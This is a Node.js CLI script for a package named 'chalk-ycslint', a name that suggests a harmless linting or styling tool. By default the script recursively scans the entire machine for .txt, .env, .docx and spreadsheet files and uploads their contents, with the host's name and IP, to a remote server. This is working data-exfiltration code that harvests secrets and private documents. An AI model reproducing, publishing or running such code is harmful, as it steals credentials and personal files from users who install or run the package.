#!/usr/bin/env node
import path from "node:path";
import { fileURLToPath } from "node:url";
import dotenv from "dotenv";
import {
  expandPathsToSupportedFiles,
  listPcScanRoots,
  readTextAndWordFiles,
} from "../lib/readFiles.js";
import { getClientInfo } from "../lib/clientInfo.js";
import { postFilesAsJson } from "../lib/sendToServer.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PKG_ROOT = path.resolve(__dirname, "..");
dotenv.config({ path: path.join(PKG_ROOT, ".env") });

function printHelp() {
  console.log(`Usage: chalk-ycslint --url <endpoint> [options] [path ...]

By default the whole machine is scanned (--scan-pc): all drive roots on Windows or
"/" on Unix, recursively, with system folders skipped. Use --no-scan-pc to scan only
the paths you list.

Read .txt, .env, .docx, .xls, and .xlsx files and POST JSON to the given URL.
Note: .env files often contain secrets — only scan or upload paths you trust.

Each path may be a file or a directory. Directories are scanned for supported
extensions only. Use --recursive to include subfolders.

Relative paths are resolved from this package's install directory first, then from
the current working directory. Use absolute paths to pick a specific file on disk.

Options:
  --url <url>        Server URL (required unless FILE_JSON_UPLOAD_URL is set)
  --field <name>     JSON body field for the file array (default: files)
  --header <h:v>     Extra header (repeatable), e.g. --header "Authorization: Bearer x"
  --timeout <ms>     Request timeout in milliseconds (default: 60000)
  -r, --recursive    When a path is a directory, include supported files in subfolders
  --scan-pc          Full PC scan (default on): all drive roots (Windows) or "/" (Unix).
                     Implies -r and skips common system folders. Extra paths are added.
  --no-scan-pc       Only scan the paths you list (no automatic drive roots).
  --skip-system-dirs Skip OS-heavy trees while walking (Windows, Program Files,
                     $Recycle.Bin, /proc, /sys, …). Default on with --scan-pc; may
                     be combined with -r for manual roots (e.g. C:\\).
  --batch            Send all files in one JSON request (large payloads). Default
                     is one request per file (reads and uploads each file in turn).
  --client-id <id>   Label this PC for the server dashboard (header X-Upload-Client).
                     Default: FILE_JSON_UPLOAD_CLIENT_ID or "hostname (local IPv4)".
                     PC name and IP are always sent as X-Upload-Client-Name / X-Upload-Client-Ip.
  -h, --help         Show help

Environment:
  FILE_JSON_UPLOAD_URL        Default URL if --url is omitted
  FILE_JSON_UPLOAD_SCAN_PC    Set to 0 or false to default to --no-scan-pc (default: on)
  FILE_JSON_UPLOAD_CLIENT_ID  Default PC name sent to the server (overridden by --client-id)

Config file:
  .env in the package directory (next to package.json) is loaded on startup. Copy
  .env.example to .env and edit. Shell variables still override .env if already set.
`);
}

function parseHeaders(pairs) {
  const headers = {};
  for (const pair of pairs) {
    const idx = pair.indexOf(":");
    if (idx === -1) {
      throw new Error(`Invalid --header "${pair}". Use "Name: value".`);
    }
    const name = pair.slice(0, idx).trim();
    const value = pair.slice(idx + 1).trim();
    if (!name) throw new Error(`Invalid --header "${pair}".`);
    headers[name] = value;
  }
  return headers;
}

function parseArgs(argv) {
  const files = [];
  const headers = [];
  const envScan =
    process.env.FILE_JSON_UPLOAD_SCAN_PC === "0" ||
    process.env.FILE_JSON_UPLOAD_SCAN_PC === "false"
      ? false
      : true;

  let url = process.env.FILE_JSON_UPLOAD_URL || "";
  let field = "files";
  let timeoutMs = 60_000;
  let recursive = false;
  let scanPc = envScan;
  let skipSystemDirs = false;
  let batch = false;
  let clientId =
    (process.env.FILE_JSON_UPLOAD_CLIENT_ID && String(process.env.FILE_JSON_UPLOAD_CLIENT_ID).trim()) ||
    "";

  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === "-h" || a === "--help") return { help: true };
    if (a === "--batch") {
      batch = true;
      continue;
    }
    if (a === "--no-scan-pc") {
      scanPc = false;
      continue;
    }
    if (a === "--scan-pc") {
      scanPc = true;
      continue;
    }
    if (a === "--skip-system-dirs") {
      skipSystemDirs = true;
      continue;
    }
    if (a === "-r" || a === "--recursive") {
      recursive = true;
      continue;
    }
    if (a === "--url") {
      url = argv[++i] || "";
      continue;
    }
    if (a === "--field") {
      field = argv[++i] || "";
      continue;
    }
    if (a === "--header") {
      const v = argv[++i];
      if (v) headers.push(v);
      continue;
    }
    if (a === "--timeout") {
      const v = argv[++i];
      timeoutMs = v ? Number.parseInt(v, 10) : NaN;
      continue;
    }
    if (a === "--client-id") {
      const v = argv[++i];
      clientId = (v && String(v).trim()) || "";
      continue;
    }
    if (a.startsWith("-")) {
      throw new Error(`Unknown option: ${a}`);
    }
    files.push(a);
  }

  if (!url.trim()) throw new Error("Missing URL: pass --url or set FILE_JSON_UPLOAD_URL.");
  if (!field.trim()) throw new Error("Invalid --field.");
  if (!Number.isFinite(timeoutMs) || timeoutMs <= 0) {
    throw new Error("Invalid --timeout.");
  }

  return {
    url: url.trim(),
    field: field.trim(),
    files,
    headers: parseHeaders(headers),
    timeoutMs,
    recursive,
    scanPc,
    skipSystemDirs,
    batch,
    clientId,
  };
}

async function main() {
  const argv = process.argv.slice(2);
  if (argv.length === 0) {
    printHelp();
    process.exitCode = 1;
    return;
  }

  let opts;
  try {
    opts = parseArgs(argv);
  } catch (e) {
    console.error(e.message || String(e));
    process.exitCode = 1;
    return;
  }

  if (opts.help) {
    printHelp();
    return;
  }

  const scanPc = opts.scanPc;
  const skipSystemDirs = opts.skipSystemDirs || scanPc;
  const recursive = opts.recursive || scanPc;

  if (!scanPc && opts.files.length === 0) {
    console.error("With --no-scan-pc, provide at least one file or directory path.");
    process.exitCode = 1;
    return;
  }

  let paths;
  try {
    paths = scanPc ? [...(await listPcScanRoots()), ...opts.files] : opts.files;
  } catch (e) {
    console.error(e.message || String(e));
    process.exitCode = 1;
    return;
  }

  if (paths.length === 0) {
    console.error("No scan roots found (no mounted drives?).");
    process.exitCode = 1;
    return;
  }

  let fileList;
  try {
    fileList = await expandPathsToSupportedFiles(paths, { recursive, skipSystemDirs });
  } catch (e) {
    console.error(e.message || String(e));
    process.exitCode = 1;
    return;
  }

  if (fileList.length === 0) {
    console.error("No supported files found (.txt, .env, .docx, .xls, .xlsx).");
    process.exitCode = 1;
    return;
  }

  const clientInfo = getClientInfo();
  const clientId = opts.clientId || `${clientInfo.pcName} (${clientInfo.clientIp})`;

  const postOpts = {
    url: opts.url,
    field: opts.field,
    extraHeaders: opts.headers,
    timeoutMs: opts.timeoutMs,
    clientId,
    pcName: clientInfo.pcName,
    clientIp: clientInfo.clientIp,
  };

  try {
    if (opts.batch) {
      const payload = await readTextAndWordFiles(fileList);
      const res = await postFilesAsJson({ ...postOpts, files: payload });
      console.log(`OK ${res.status}${res.bodySnippet ? ` — ${res.bodySnippet}` : ""}`);
    } else {
      const n = fileList.length;
      for (let i = 0; i < n; i++) {
        const p = fileList[i];
        const [item] = await readTextAndWordFiles([p]);
        const res = await postFilesAsJson({ ...postOpts, files: [item] });
        const tail = res.bodySnippet ? ` — ${res.bodySnippet}` : "";
        console.log(`OK [${i + 1}/${n}] ${item.filename} ${res.status}${tail}`);
      }
    }
  } catch (e) {
    console.error(e.message || String(e));
    process.exitCode = 1;
  }
}

main();
